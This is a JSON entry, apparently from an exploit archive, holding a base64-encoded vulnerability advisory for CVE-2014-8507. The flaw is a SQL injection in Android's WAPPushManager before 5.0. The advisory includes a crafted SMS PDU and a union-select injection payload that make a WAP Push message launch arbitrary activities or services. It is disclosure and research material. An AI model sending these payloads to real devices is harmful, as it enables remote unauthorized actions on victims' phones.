{
    "source": "exploit-database", 
    "exploit": "SU5UUk9EVUNUSU9ODQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpJbiBBbmRyb2lkIDw1LjAsIGEgU1FMIGluamVjdGlvbiB2dWxuZXJhYmlsaXR5IGV4aXN0cyBpbiB0aGUgb3B0IG1vZHVsZSBXQVBQdXNoTWFuYWdlciwgYXR0YWNrZXIgY2FuIHJlbW90ZWx5IHNlbmQgbWFsZm9ybWVkIFdBUFB1c2ggbWVzc2FnZSB0byBsYXVuY2ggYW55IGFjdGl2aXR5IG9yIHNlcnZpY2UgaW4gdGhlIHZpY3RpbSdzIHBob25lIChuZWVkIHBlcm1pc3Npb24gY2hlY2spDQoNCkRFVEFJTFMNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCldoZW4gYSBXQVBQdXNoIG1lc3NhZ2UgaXMgcmVjZWl2ZWQsIHRoZSByYXcgcGR1IGlzIHByb2Nlc3NlZCBieSBkaXNwYXRjaFdhcFBkdSBtZXRob2QgaW4gY29tXGFuZHJvaWRcaW50ZXJuYWxcdGVsZXBob255XFdhcFB1c2hPdmVyU21zLmphdmENCg0KSGVyZSB0aGUgcGR1IGlzIHBhcnNlZCB0byBnZXQgdGhlIGNvbnRlbnRUeXBlICYgd2FwQXBwSWQ6DQoNCiAgICAgICAgICAgIFN0cmluZyBtaW1lVHlwZSA9IHBkdURlY29kZXIuZ2V0VmFsdWVTdHJpbmcoKTsNCiAgICAgICAgICAgIC4uLg0KICAgICAgICAgICAgLyoqDQogICAgICAgICAgICAgKiBTZWVrIGZvciBhcHBsaWNhdGlvbiBJRCBmaWVsZCBpbiBXU1AgaGVhZGVyLg0KICAgICAgICAgICAgICogSWYgYXBwbGljYXRpb24gSUQgaXMgZm91bmQsIFdhcFB1c2hNYW5hZ2VyIHN1YnN0aXR1dGUgdGhlIG1lc3NhZ2UNCiAgICAgICAgICAgICAqIHByb2Nlc3NpbmcuIFNpbmNlIFdhcFB1c2hNYW5hZ2VyIGlzIG9wdGlvbmFsIG1vZHVsZSwgaWYgV2FwUHVzaE1hbmFnZXINCiAgICAgICAgICAgICAqIGlzIG5vdCBmb3VuZCwgbGVnYWN5IG1lc3NhZ2UgcHJvY2Vzc2luZyB3aWxsIGJlIGNvbnRpbnVlZC4NCiAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgaWYgKHBkdURlY29kZXIuc2Vla1hXYXBBcHBsaWNhdGlvbklkKGluZGV4LCBpbmRleCArIGhlYWRlckxlbmd0aCAtIDEpKSB7DQogICAgICAgICAgICAgICAgaW5kZXggPSAoaW50KSBwZHVEZWNvZGVyLmdldFZhbHVlMzIoKTsNCiAgICAgICAgICAgICAgICBwZHVEZWNvZGVyLmRlY29kZVhXYXBBcHBsaWNhdGlvbklkKGluZGV4KTsNCiAgICAgICAgICAgICAgICBTdHJpbmcgd2FwQXBwSWQgPSBwZHVEZWNvZGVyLmdldFZhbHVlU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgaWYgKHdhcEFwcElkID09IG51bGwpIHsNCiAgICAgICAgICAgICAgICAgICAgd2FwQXBwSWQgPSBJbnRlZ2VyLnRvU3RyaW5nKChpbnQpIHBkdURlY29kZXIuZ2V0VmFsdWUzMigpKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgU3RyaW5nIGNvbnRlbnRUeXBlID0gKChtaW1lVHlwZSA9PSBudWxsKSA/DQogICAgICAgICAgICAgICAgICAgICAgICBMb25nLnRvU3RyaW5nKGJpbmFyeUNvbnRlbnRUeXBlKSA6IG1pbWVUeXBlKTsNCiAgICAgICAgICAgICAgICBpZiAoREJHKSBSbG9nLnYoVEFHLCAiYXBwaWQgZm91bmQ6ICIgKyB3YXBBcHBJZCArICI6IiArIGNvbnRlbnRUeXBlKTsNCg0KVGhlIHdhcEFwcElkICYgY29udGVudFR5cGUgY2FuIGJlIGxpdGVyYWwgc3RyaW5nIGVtYmVkZWQgaW4gdGhlIHBkdSwgdG8gcHJvdmUgdGhpcywgd2UgY2FuIGxhdW5jaCBBbmRyb2lkIDQuNCBlbXVsYXRvciBhbmQgc2VuZCBzbXMgcGR1IGJ5IHRlbG5ldCBjb25zb2xlDQoNClR5cGUgdGhlIGZvbGxvd2luZyBjb21tYW5kIGluIHRlbG5ldCBjb25zb2xlOg0KDQpzbXMgcGR1IDAwNDAwMDBCOTE1MTIxNTUxNTMyRjQwMDA0ODAwQjA1MDQwQjg0QzAwMjAwMDNGMDAxMDEwQTA2NTYwM0IwODFFQUFGMjcyMDc1NmU2OTZmNmUyMDczNjU2YzY1NjM3NDIwMzAyYzI3NjM2ZjZkMmU2MTZlNjQ3MjZmNjk2NDJlNzM2NTc0NzQ2OTZlNjc3MzI3MmMyNzYzNmY2ZDJlNjE2ZTY0NzI2ZjY5NjQyZTczNjU3NDc0Njk2ZTY3NzMyZTUzNjU3NDc0Njk2ZTY3NzMyNzJjMzAyYzMwMmMzMDJkMmQyMDAwMDIwNjZBMDA4NTA5MDM2RDZGNjI2OTZDNjU3NDY5NjQ2OTZFNjc3MzJFNjM2RjZEMkYwMDAxDQoNCkFuZCB3YXRjaCB0aGUgcmFkaW8gbG9nY2F0IG1lc3NhZ2UgaW4gZW11bGF0b3IsIGl0IHByaW50cyBvdXQgdGhlIGV4dHJhY3RlZCBtYWxpY2lvdXMgYXBwaWQ6DQonIHVuaW9uIHNlbGVjdCAwLCdjb20uYW5kcm9pZC5zZXR0aW5ncycsJ2NvbS5hbmRyb2lkLnNldHRpbmdzLlNldHRpbmdzJywwLDAsMC0tDQoNCkhvd2V2ZXIsIHNpbmNlIHRoZSBXQVBQdXNoTWFuYWdlciBpcyBvcHRpb25hbCwgaXQgaXMgbm90IGluc3RhbGxlZCBpbiB0aGUgZW11bGF0b3IsIHNvIGl0IHRoZW4gcHJpbnRzICJ3YXAgcHVzaCBtYW5hZ2VyIG5vdCBmb3VuZCEiDQoNCkJ1dCBpZiB0aGUgV0FQUHVzaE1hbmFnZXIgaXMgaW5zdGFsbGVkLCB0aGUgZXh0cmFjdGVkIHdhcEFwcElkICYgY29udGVudFR5cGUgd2lsbCBiZSBzZW5kIHRvIGl0cyBtZXRob2QgcHJvY2Vzc01lc3NhZ2U6DQoNCiAgICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgICBib29sZWFuIHByb2Nlc3NGdXJ0aGVyID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgSVdhcFB1c2hNYW5hZ2VyIHdhcFB1c2hNYW4gPSBtV2FwUHVzaE1hbmFnZXI7DQogICAgICAgICAgICAgICAgICAgIGlmICh3YXBQdXNoTWFuID09IG51bGwpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChEQkcpIFJsb2cudyhUQUcsICJ3YXAgcHVzaCBtYW5hZ2VyIG5vdCBmb3VuZCEiKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEludGVudCBpbnRlbnQgPSBuZXcgSW50ZW50KCk7DQogICAgICAgICAgICAgICAgICAgICAgICBpbnRlbnQucHV0RXh0cmEoInRyYW5zYWN0aW9uSWQiLCB0cmFuc2FjdGlvbklkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGludGVudC5wdXRFeHRyYSgicGR1VHlwZSIsIHBkdVR5cGUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW50ZW50LnB1dEV4dHJhKCJoZWFkZXIiLCBoZWFkZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW50ZW50LnB1dEV4dHJhKCJkYXRhIiwgaW50ZW50RGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpbnRlbnQucHV0RXh0cmEoImNvbnRlbnRUeXBlUGFyYW1ldGVycyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBkdURlY29kZXIuZ2V0Q29udGVudFBhcmFtZXRlcnMoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHJvY1JldCA9IHdhcFB1c2hNYW4ucHJvY2Vzc01lc3NhZ2Uod2FwQXBwSWQsIGNvbnRlbnRUeXBlLCBpbnRlbnQpOw0KDQpTbyB3ZSBnbyBvbiBjaGVja2luZyB0aGUgIHNvdXJjZSBjb2RlIG9mIFdBUFB1c2hNYW5hZ2VyOg0KDQpodHRwczovL2FuZHJvaWQuZ29vZ2xlc291cmNlLmNvbS9wbGF0Zm9ybS9mcmFtZXdvcmtzL2Jhc2UvKy9hbmRyb2lkLTQuNC40X3IyLjAuMS9wYWNrYWdlcy9XQVBQdXNoTWFuYWdlci8NCg0KSW4gdGhlIG1ldGhvZCBwcm9jZXNzTWVzc2FnZSwgdGhlIGFwcF9pZCBhbmQgY29udGVudF90eXBlIGlzIHVzZWQgaW4gdGhlIG1ldGhvZCBxdWVyeUxhc3RBcHA6DQoNCiAgICAgICAgcHVibGljIGludCBwcm9jZXNzTWVzc2FnZShTdHJpbmcgYXBwX2lkLCBTdHJpbmcgY29udGVudF90eXBlLCBJbnRlbnQgaW50ZW50KQ0KICAgICAgICAgICAgdGhyb3dzIFJlbW90ZUV4Y2VwdGlvbiB7DQogICAgICAgICAgICBMb2cuZChMT0dfVEFHLCAid3BtYW4gcHJvY2Vzc01zZyAiICsgYXBwX2lkICsgIjoiICsgY29udGVudF90eXBlKTsNCiAgICAgICAgICAgIFdhcFB1c2hNYW5EQkhlbHBlciBkYmggPSBnZXREYXRhYmFzZShtQ29udGV4dCk7DQogICAgICAgICAgICBTUUxpdGVEYXRhYmFzZSBkYiA9IGRiaC5nZXRSZWFkYWJsZURhdGFiYXNlKCk7DQogICAgICAgICAgICBXYXBQdXNoTWFuREJIZWxwZXIucXVlcnlEYXRhIGxhc3RhcHAgPSBkYmgucXVlcnlMYXN0QXBwKGRiLCBhcHBfaWQsIGNvbnRlbnRfdHlwZSk7DQogICAgICAgICAgICBkYi5jbG9zZSgpOw0KDQpUaGVuIGluIHRoZSBtZXRob2QgcXVlcnlMYXN0QXBwLCBib3RoIGFwcF9pZCBhbmQgY29udGVudF90eXBlIGlzIGNvbmNhdGVuYXRlZCB3aXRob3V0IGFueSBlc2NhcGluZyB0byBidWlsZCB0aGUgcmF3UXVlcnkgc3FsIGlucHV0LA0KDQogICAgICAgIHByb3RlY3RlZCBxdWVyeURhdGEgcXVlcnlMYXN0QXBwKFNRTGl0ZURhdGFiYXNlIGRiLA0KICAgICAgICAgICAgICAgIFN0cmluZyBhcHBfaWQsIFN0cmluZyBjb250ZW50X3R5cGUpIHsNCiAgICAgICAgICAgIFN0cmluZyBzcWwgPSAic2VsZWN0IGluc3RhbGxfb3JkZXIsIHBhY2thZ2VfbmFtZSwgY2xhc3NfbmFtZSwgIg0KICAgICAgICAgICAgICAgICAgICArICIgYXBwX3R5cGUsIG5lZWRfc2lnbmF0dXJlLCBmdXJ0aGVyX3Byb2Nlc3NpbmciDQogICAgICAgICAgICAgICAgICAgICsgIiBmcm9tICIgKyBBUFBJRF9UQUJMRV9OQU1FDQogICAgICAgICAgICAgICAgICAgICsgIiB3aGVyZSB4X3dhcF9hcHBsaWNhdGlvbj1cJyIgKyBhcHBfaWQgKyAiXCciDQogICAgICAgICAgICAgICAgICAgICsgIiBhbmQgY29udGVudF90eXBlPVwnIiArIGNvbnRlbnRfdHlwZSArICJcJyINCiAgICAgICAgICAgICAgICAgICAgKyAiIG9yZGVyIGJ5IGluc3RhbGxfb3JkZXIgZGVzYyI7DQogICAgICAgICAgICBpZiAoREVCVUdfU1FMKSBMb2cudihMT0dfVEFHLCAic3FsOiAiICsgc3FsKTsNCiAgICAgICAgICAgIEN1cnNvciBjdXIgPSBkYi5yYXdRdWVyeShzcWwsIG51bGwpOw0KDQpPYnZpb3VzbHksIHRoaXMgaXMgYSBTUUwgaW5qZWN0aW9uLCBmb3IgZXhhbXBsZSwgaWYgYXBwX2lkIGlzIGFzIGZvbGxvd3M6DQonIHVuaW9uIHNlbGVjdCAwLCdjb20uYW5kcm9pZC5zZXR0aW5ncycsJ2NvbS5hbmRyb2lkLnNldHRpbmdzLlNldHRpbmdzJywwLDAsMC0tDQoNClRoZW4gdGhlIHBhY2thZ2VfbmFtZSAmIGNsYXNzX25hbWUgb2YgcXVlcnkgcmVzdWx0IHdvdWxkIGJlOg0KImNvbS5hbmRyb2lkLnNldHRpbmdzIiBhbmQgImNvbS5hbmRyb2lkLnNldHRpbmdzLlNldHR0aW5ncyINCg0KT0ssIHRoZW4gd2UgcmV0dXJuIGJhY2sgdG8gdGhlIG1ldGhvZCBwcm9jZXNzTWVzc2FnZSBvZiBXQVBQdXNoTWFuYWdlcg0KVGhlIGFwcFR5cGUsIHBhY2thZ2VOYW1lLCBjbGFzc05hbWUgaXMgZnVsbHkgY29udHJvbGxhYmxlLCB3aGljaCB3aWxsIGJlIHVzZWQgdG8gc2V0IHRoZSBjb21wb25lbnQgb2YgYW4gaW50ZW50IHRvIHN0YXJ0IGEgYWN0aXZpdHkgb3Igc2VydmljZQ0KVGhhdCBtZWFucywgYXR0YWNrZXIgY2FuIHJlbW90ZWx5IGxhdW5jaCBhbnkgYWN0aXZpdHkgb3Igc2VydmljZSBieSBjb25zdHJ1Y3QgbWFsZm9ybWVkIFdBUFB1c2ggTWVzc2FnZSAobmVlZCBwZXJtaXNzaW9uIGNoZWNrKQ0KDQogICAgICAgICAgICBpZiAobGFzdGFwcC5hcHBUeXBlID09IFdhcFB1c2hNYW5hZ2VyUGFyYW1zLkFQUF9UWVBFX0FDVElWSVRZKSB7DQogICAgICAgICAgICAgICAgLy9JbnRlbnQgaW50ZW50ID0gbmV3IEludGVudChJbnRlbnQuQUNUSU9OX01BSU4pOw0KICAgICAgICAgICAgICAgIGludGVudC5zZXRDbGFzc05hbWUobGFzdGFwcC5wYWNrYWdlTmFtZSwgbGFzdGFwcC5jbGFzc05hbWUpOw0KICAgICAgICAgICAgICAgIGludGVudC5zZXRGbGFncyhJbnRlbnQuRkxBR19BQ1RJVklUWV9ORVdfVEFTSyk7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgbUNvbnRleHQuc3RhcnRBY3Rpdml0eShpbnRlbnQpOw0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEFjdGl2aXR5Tm90Rm91bmRFeGNlcHRpb24gZSkgew0KICAgICAgICAgICAgICAgICAgICBMb2cudyhMT0dfVEFHLCAiaW52YWxpZCBuYW1lICIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RhcHAucGFja2FnZU5hbWUgKyAiLyIgKyBsYXN0YXBwLmNsYXNzTmFtZSk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBXYXBQdXNoTWFuYWdlclBhcmFtcy5JTlZBTElEX1JFQ0VJVkVSX05BTUU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBpbnRlbnQuc2V0Q2xhc3NOYW1lKG1Db250ZXh0LCBsYXN0YXBwLmNsYXNzTmFtZSk7DQogICAgICAgICAgICAgICAgaW50ZW50LnNldENvbXBvbmVudChuZXcgQ29tcG9uZW50TmFtZShsYXN0YXBwLnBhY2thZ2VOYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgbGFzdGFwcC5jbGFzc05hbWUpKTsNCiAgICAgICAgICAgICAgICBpZiAobUNvbnRleHQuc3RhcnRTZXJ2aWNlKGludGVudCkgPT0gbnVsbCkgew0KICAgICAgICAgICAgICAgICAgICBMb2cudyhMT0dfVEFHLCAiaW52YWxpZCBuYW1lICIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RhcHAucGFja2FnZU5hbWUgKyAiLyIgKyBsYXN0YXBwLmNsYXNzTmFtZSk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBXYXBQdXNoTWFuYWdlclBhcmFtcy5JTlZBTElEX1JFQ0VJVkVSX05BTUU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQpUaGlzIGhhcyBiZWVuIGZpeGVkIGluIGFuZHJvaWQgNS4wIChhbmRyb2lkIGJ1ZyBpZCAxNzk2OTEzNSkNCmh0dHBzOi8vYW5kcm9pZC5nb29nbGVzb3VyY2UuY29tL3BsYXRmb3JtL2ZyYW1ld29ya3MvYmFzZS8rLzQ4ZWQ4MzU0NjhjNjIzNTkwNTQ1OWU2ZWY3ZGYwMzJiYWYzZTRkZjYNCg0KVElNRUxJTkUNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCjExLjEwLjIwMTQgSW5pdGlhbCByZXBvcnQgdG8gQW5kcm9pZCBTZWN1cml0eSBUZWFtIHdpdGggdGhlIFBPQw0KMTQuMTAuMjAxNCBSZXBseSBmcm9tIEFuZHJvaWQgU2VjdXJpdHkgVGVhbSAiYXJlIGxvb2tpbmcgaW50byBpdCINCjA0LjExLjIwMTQgQW5kcm9pZCA1LjAgc291cmNlIGNvZGUgaXMgb3BlbiwgdGhlIGZpeCBmb3IgdGhpcyBpc3N1ZSBpcyBmb3VuZCBpbiBjaGFuZ2UgbG9nLCByZXF1ZXN0IHN0YXR1cyB1cGRhdGUNCjA4LjExLjIwMTQgUmVwbHkgZnJvbSBBbmRyb2lkIFNlY3VyaXR5IFRlYW0gImhhdmUgZml4ZWQgdGhlIGlzc3VlIGluIEwgKHdoaWNoIGlzIG5vdyBpbiBBT1NQKSBhbmQgaGF2ZSBwcm92aWRlZCBwYXRjaGVzIHRvIHBhcnRuZXJzIg0KMDkuMTEuMjAxNCBDb250YWN0IE1JVFJFIGFib3V0IHRoaXMgaXNzdWUNCjE3LjExLjIwMTQgQ1ZFLTIwMTQtODUwNyBhc3NpZ25lZA0KMjYuMTEuMjAxNCBQdWJsaWMgRGlzY2xvc3VyZQ0KDQpJREVOVElGSUVSUw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KQ1ZFLTIwMTQtODUwNw0KQW5kcm9pZCBpZCAxNzk2OTEzNQ0KDQpDUkVESVRTDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpXYW5nVGFvIChuZW9ieXRlKSBvZiBCYWlkdSBYLVRlYW0NCldhbmdZdSBvZiBCYWlkdSBYLVRlYW0NClpoYW5nIERvbmdodWkgb2YgQmFpZHUgWC1UZWFtDQoNCi0tDQpCQUlEVSBYLVRFQU0gKHh0ZWFtLmJhaWR1LmNvbSkNCkFuIGV4dGVybmFsIGxpbmsgb2YgdGhpcyBhZHZpc29yeSBjYW4gYmUgZm91bmQgYXQgaHR0cDovL3h0ZWFtLmJhaWR1LmNvbS8/cD0xNjc=", 
    "filename": "platforms/android/dos/35382.txt", 
    "id": "35382", 
    "cves": [
        "CVE-2014-8507"
    ]
}